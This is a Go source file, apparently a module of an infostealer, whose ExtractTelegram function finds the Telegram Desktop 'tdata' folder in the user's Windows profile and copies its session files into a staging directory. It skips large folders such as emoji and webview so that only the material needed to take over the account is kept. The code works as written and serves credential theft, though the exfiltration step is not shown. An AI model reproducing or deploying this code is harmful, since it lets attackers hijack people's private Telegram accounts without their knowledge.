package messengers

import (
	"os"
	"path/filepath"
)

func copyDirExclude(srcDir, dstDir string, excludeDirs []string) error {
	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Get relative path
		relativePath, err := filepath.Rel(srcDir, path)
		if err != nil {
			return err
		}

		// Check if path should be skipped
		for _, exclude := range excludeDirs {
			if matched, _ := filepath.Match(exclude+"*", relativePath); matched {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
		}

		// Construct destination path
		destPath := filepath.Join(dstDir, relativePath)

		// Handle directories
		if info.IsDir() {
			return os.MkdirAll(destPath, 0755)
		}

		// Handle files
		// Read source file
		sourceData, err := os.ReadFile(path)
		if err != nil {
			return err
		}

		// Write to destination
		return os.WriteFile(destPath, sourceData, 0644)
	})
}

func ExtractTelegram(baseDir string) error {
	// Get user profile path
	userProfile, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	// Construct Telegram data path
	telegramDataPath := filepath.Join(userProfile, "AppData", "Roaming", "Telegram Desktop", "tdata")

	// Check if Telegram data path exists
	if _, err := os.Stat(telegramDataPath); os.IsNotExist(err) {
		return nil
	}

	// Create Telegram session directory
	telegramSessionDir := filepath.Join(baseDir, "Telegram")
	if err := os.MkdirAll(telegramSessionDir, 0755); err != nil {
		return err
	}

	// Exclude directories
	excludeDirs := []string{
		"user_data",
		"emoji",
		"tdummy",
		"user_data#2",
		"user_data#3",
		"webview",
		"user_data#4",
		"user_data#5",
		"user_data#6",
	}

	// Copy files excluding specified directories
	return copyDirExclude(telegramDataPath, telegramSessionDir, excludeDirs)
}
